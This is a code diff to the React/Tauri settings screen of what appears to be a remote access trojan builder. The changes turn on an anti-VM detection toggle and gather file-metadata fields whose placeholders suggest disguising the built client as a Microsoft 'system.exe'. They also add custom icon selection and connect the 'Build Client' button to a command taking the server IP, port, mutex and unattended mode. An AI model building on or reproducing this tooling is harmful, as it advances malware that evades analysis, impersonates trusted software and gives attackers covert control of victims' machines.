@@ -1,4 +1,5 @@
-import { useContext, useState } from "react";
+import { useContext, useEffect, useState } from "react";
+import { open } from "@tauri-apps/api/dialog";
 import {
   IconBell,
   IconBellOff,
@@ -35,6 +36,8 @@ import {
 } from "@tabler/icons-react";
 
 import { RATContext } from "../rat/RATContext";
+import { AssemblyInfo } from "../../types";
+import { invoke } from "@tauri-apps/api/tauri";
 import { buildClientCmd } from "../rat/RATCommands";
 
 export const Settings = () => {
@@ -59,18 +62,31 @@ export const Settings = () => {
   const [enableMutex, setEnableMutex] = useState(false);
   const [mutexName, setMutexName] = useState<string>("");
   // const [attemptUacBypass, setAttemptUacBypass] = useState(false);
-  // const [antiVmDetection, setAntiVmDetection] = useState(false);
+  const [antiVmDetection, setAntiVmDetection] = useState(false);
 
-  const [assemblyName, setAssemblyName] = useState<string>("");
-  const [assemblyDescription, setAssemblyDescription] = useState<string>("");
-  const [assemblyCompany, setAssemblyCompany] = useState<string>("");
-  const [assemblyCopyright, setAssemblyCopyright] = useState<string>("");
-  const [assemblyTrademarks, setAssemblyTrademarks] = useState<string>("");
-  const [assemblyOriginalFilename, setAssemblyOriginalFilename] =
-    useState<string>("");
-  const [assemblyProductVersion, setAssemblyProductVersion] =
-    useState<string>("");
-  const [assemblyFileVersion, setAssemblyFileVersion] = useState<string>("");
+  const [assemblyInfo, setAssemblyInfo] = useState<AssemblyInfo>({
+    assembly_name: "",
+    assembly_description: "",
+    assembly_company: "",
+    assembly_copyright: "",
+    assembly_trademarks: "",
+    assembly_original_filename: "",
+    assembly_product_version: "",
+    assembly_file_version: "",
+  });
+
+  const [iconPath, setIconPath] = useState<string>("");
+
+  const [iconData, setIconData] = useState<string>("");
+
+  useEffect(() => {
+    if (iconPath) {
+      invoke("read_icon", { path: iconPath }).then((data) => {
+        console.log(data);
+        setIconData(data as string);
+      });
+    }
+  }, [iconPath]);
 
   const steps = [
     { name: "Connection", icon: <IconServerCog /> },
@@ -304,10 +320,10 @@ export const Settings = () => {
                     </div>
                   </div>
 
-                  <div className="flex items-center justify-between mb-2">
+                  {/* <div className="flex items-center justify-between mb-2">
                     <div className="flex items-center">
                       <IconShield className="mr-2 text-red-400" size={20} />
-                      <span>Process Critical</span>
+                      <span>Critical Process</span>
                     </div>
                     <button
                       onClick={() => setProcessCritical(!processCritical)}
@@ -321,7 +337,7 @@ export const Settings = () => {
                         <IconToggleLeft size={24} />
                       )}
                     </button>
-                  </div>
+                  </div> */}
 
                   <div className="flex items-center justify-between mb-2">
                     <div className="flex items-center">
@@ -379,7 +395,7 @@ export const Settings = () => {
                     </button>
                   </div> */}
 
-                  {/* <div className="flex items-center justify-between mb-2">
+                  <div className="flex items-center justify-between mb-2">
                     <div className="flex items-center">
                       <IconEyeglassOff
                         className="mr-2 text-teal-400"
@@ -399,7 +415,7 @@ export const Settings = () => {
                         <IconToggleLeft size={24} />
                       )}
                     </button>
-                  </div> */}
+                  </div>
                 </div>
               )}
 
@@ -416,8 +432,13 @@ export const Settings = () => {
                         type="text"
                         className="bg-primarybg border border-accentx rounded-lg p-2 text-white"
                         placeholder="My Application"
-                        value={assemblyName}
-                        onChange={(e) => setAssemblyName(e.target.value)}
+                        value={assemblyInfo.assembly_name}
+                        onChange={(e) =>
+                          setAssemblyInfo({
+                            ...assemblyInfo,
+                            assembly_name: e.target.value,
+                          })
+                        }
                       />
                     </div>
 
@@ -429,8 +450,13 @@ export const Settings = () => {
                         type="text"
                         className="bg-primarybg border border-accentx rounded-lg p-2 text-white"
                         placeholder="System Application"
-                        value={assemblyDescription}
-                        onChange={(e) => setAssemblyDescription(e.target.value)}
+                        value={assemblyInfo.assembly_description}
+                        onChange={(e) =>
+                          setAssemblyInfo({
+                            ...assemblyInfo,
+                            assembly_description: e.target.value,
+                          })
+                        }
                       />
                     </div>
 
@@ -440,8 +466,13 @@ export const Settings = () => {
                         type="text"
                         className="bg-primarybg border border-accentx rounded-lg p-2 text-white"
                         placeholder="Microsoft Corporation"
-                        value={assemblyCompany}
-                        onChange={(e) => setAssemblyCompany(e.target.value)}
+                        value={assemblyInfo.assembly_company}
+                        onChange={(e) =>
+                          setAssemblyInfo({
+                            ...assemblyInfo,
+                            assembly_company: e.target.value,
+                          })
+                        }
                       />
                     </div>
 
@@ -451,8 +482,13 @@ export const Settings = () => {
                         type="text"
                         className="bg-primarybg border border-accentx rounded-lg p-2 text-white"
                         placeholder="© 2023"
-                        value={assemblyCopyright}
-                        onChange={(e) => setAssemblyCopyright(e.target.value)}
+                        value={assemblyInfo.assembly_copyright}
+                        onChange={(e) =>
+                          setAssemblyInfo({
+                            ...assemblyInfo,
+                            assembly_copyright: e.target.value,
+                          })
+                        }
                       />
                     </div>
 
@@ -464,8 +500,13 @@ export const Settings = () => {
                         type="text"
                         className="bg-primarybg border border-accentx rounded-lg p-2 text-white"
                         placeholder="Microsoft Trademark"
-                        value={assemblyTrademarks}
-                        onChange={(e) => setAssemblyTrademarks(e.target.value)}
+                        value={assemblyInfo.assembly_trademarks}
+                        onChange={(e) =>
+                          setAssemblyInfo({
+                            ...assemblyInfo,
+                            assembly_trademarks: e.target.value,
+                          })
+                        }
                       />
                     </div>
 
@@ -477,9 +518,12 @@ export const Settings = () => {
                         type="text"
                         className="bg-primarybg border border-accentx rounded-lg p-2 text-white"
                         placeholder="system.exe"
-                        value={assemblyOriginalFilename}
+                        value={assemblyInfo.assembly_original_filename}
                         onChange={(e) =>
-                          setAssemblyOriginalFilename(e.target.value)
+                          setAssemblyInfo({
+                            ...assemblyInfo,
+                            assembly_original_filename: e.target.value,
+                          })
                         }
                       />
                     </div>
@@ -492,9 +536,12 @@ export const Settings = () => {
                         type="text"
                         className="bg-primarybg border border-accentx rounded-lg p-2 text-white"
                         placeholder="1.0.0.0"
-                        value={assemblyProductVersion}
+                        value={assemblyInfo.assembly_product_version}
                         onChange={(e) =>
-                          setAssemblyProductVersion(e.target.value)
+                          setAssemblyInfo({
+                            ...assemblyInfo,
+                            assembly_product_version: e.target.value,
+                          })
                         }
                       />
                     </div>
@@ -507,8 +554,13 @@ export const Settings = () => {
                         type="text"
                         className="bg-primarybg border border-accentx rounded-lg p-2 text-white"
                         placeholder="1.0.0.0"
-                        value={assemblyFileVersion}
-                        onChange={(e) => setAssemblyFileVersion(e.target.value)}
+                        value={assemblyInfo.assembly_file_version}
+                        onChange={(e) =>
+                          setAssemblyInfo({
+                            ...assemblyInfo,
+                            assembly_file_version: e.target.value,
+                          })
+                        }
                       />
                     </div>
                   </div>
@@ -545,16 +597,44 @@ export const Settings = () => {
 
                   {enableIcon && (
                     <div className="space-y-4 pl-4 border-l-2 border-blue-600">
-                      <button className="cursor-pointer bg-accentx hover:bg-gray-600 text-white py-2 px-4 rounded-lg flex items-center">
+                      <button
+                        className="cursor-pointer bg-accentx hover:bg-gray-600 text-white py-2 px-4 rounded-lg flex items-center"
+                        onClick={() => {
+                          open({
+                            filters: [
+                              {
+                                name: "Icon Files",
+                                extensions: ["ico"],
+                              },
+                            ],
+                          }).then((path) => {
+                            if (path) {
+                              setIconPath(path as string);
+                            }
+                          });
+                        }}
+                      >
                         <IconFolder className="mr-2" size={20} />
                         Browse Icon File
                       </button>
 
-                      <div className="bg-primarybg rounded-lg p-6 flex items-center justify-center">
-                        <div className="w-32 h-32 bg-gray-800 rounded-lg flex items-center justify-center animate-pulse">
-                          <IconPhoto size={48} className="text-gray-600" />
+                      {iconPath ? (
+                        <div className="bg-primarybg rounded-lg p-6 flex items-center justify-center">
+                          <div className="w-32 h-32 bg-gray-800 rounded-lg flex items-center justify-center animate-pulse">
+                            <img
+                              src={`data:image/x-icon;base64,${iconData}`}
+                              alt="Icon"
+                              className="w-full h-full object-contain"
+                            />
+                          </div>
                         </div>
-                      </div>
+                      ) : (
+                        <div className="bg-primarybg rounded-lg p-6 flex items-center justify-center">
+                          <div className="w-32 h-32 bg-gray-800 rounded-lg flex items-center justify-center animate-pulse">
+                            <IconPhoto size={48} className="text-gray-600" />
+                          </div>
+                        </div>
+                      )}
                     </div>
                   )}
                 </div>
@@ -654,10 +734,10 @@ export const Settings = () => {
                           {mutexName}
                         </p>
                       )}
-                      {assemblyName && (
+                      {assemblyInfo.assembly_name && (
                         <p>
                           <span className="text-gray-400">Product:</span>{" "}
-                          {assemblyName}
+                          {assemblyInfo.assembly_name}
                         </p>
                       )}
                       {enableIcon && (
@@ -707,7 +787,16 @@ export const Settings = () => {
                 <button
                   className="cursor-pointer bg-green-700 hover:bg-green-600 text-white py-2 px-4 rounded-lg flex items-center"
                   onClick={() => {
-                    // Handle build client
+                    buildClientCmd(
+                      buildIp,
+                      buildPort,
+                      enableMutex,
+                      mutexName,
+                      enableUnattended,
+                      assemblyInfo,
+                      enableIcon,
+                      iconPath
+                    );
                   }}
                 >
                   Build Client
